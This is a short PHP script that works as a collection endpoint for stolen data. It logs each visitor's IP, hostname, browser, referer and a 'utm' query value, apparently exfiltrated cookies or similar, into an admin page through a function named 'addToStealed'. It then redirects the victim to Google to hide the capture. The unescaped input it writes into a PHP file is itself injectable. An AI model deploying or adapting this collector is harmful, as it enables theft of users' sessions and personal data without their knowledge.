<?php
	function addToStealed($file, $ip, $host, $navigator, $date, $heure, $provenance, $data)
	{
		$tmp		= file($file);
		$newPage	= '';
		while($ligneActuelle = array_shift($tmp))
		{
			if($ligneActuelle == "<!-- Breakpoint -->\n")
			{
				$newPage .= "<tr>
				<td>$ip</td>
				<td>$host</td>
				<td>$navigator</td>
				<td>$date</td>
				<td>$heure</td>
				<td>$provenance</td>
				<td>$data</td>
				</tr>";
				$newPage .= "\n<!-- Breakpoint -->\n";
			}
			else
				$newPage .= $ligneActuelle;
		}
		
		$monfichier = fopen($file, 'w');
		fseek($monfichier, 0);
		fputs($monfichier, $newPage);
	 
		fclose($monfichier);
	}
	
	$ip			= $_SERVER['REMOTE_ADDR'];
	$host		= gethostbyaddr($ip);
	$navigator	= $_SERVER['HTTP_USER_AGENT'];
	$date		= date("d/m/Y");
	$heure		= date("H:i:s");
	$provenance	= (!empty($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : 'Unspecified';
	if(isset($_GET['utm']))	$data	= $_GET['utm'];
	else 					$data	= 'No data';
	
	addToStealed("admin.php", $ip, $host, $navigator, $date, $heure, $provenance, $data);
	echo "<script>window.location.replace('https://google.com');</script>";
?>
